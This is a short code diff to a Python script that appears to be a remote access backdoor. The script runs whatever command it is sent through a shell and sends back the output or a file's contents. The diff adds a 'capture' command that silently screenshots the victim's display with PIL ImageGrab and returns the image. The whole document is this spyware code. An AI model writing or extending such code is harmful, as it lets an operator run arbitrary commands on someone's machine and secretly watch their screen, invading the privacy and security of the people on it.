@@ -3,6 +3,7 @@ import time
 import os
 import subprocess
 import platform
+from PIL import ImageGrab
 
 info_platform = platform.platform()
 
@@ -53,6 +54,12 @@ while True:
             else:
                 response = f.read()
                 f.close()
+        elif commande == "capture":
+            capture = ImageGrab.grab()
+            capture.save("capture.png", "PNG")
+            f = open("capture.png", "rb")
+            response = f.read()
+            f.close()           
         else :
             resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
             response = resultat.stdout + resultat.stderr
